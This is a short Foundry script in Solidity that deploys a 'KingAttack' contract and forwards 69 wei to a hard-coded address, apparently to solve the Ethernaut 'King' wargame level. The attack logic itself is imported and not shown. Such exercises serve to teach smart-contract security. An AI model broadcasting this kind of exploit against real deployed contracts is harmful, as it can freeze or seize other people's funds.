// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { KingAttack } from "src/King/KingAttack.sol";
contract KingAttackScript is Script {
    function run() public {
        vm.startBroadcast();
            KingAttack kingAttacker = new KingAttack();
            kingAttacker.forwardFunds{value: 69 wei}(address(0x029A7E032a35506bA8Ae5aBbd24666d1B0aDd161));
        vm.stopBroadcast();
    }
}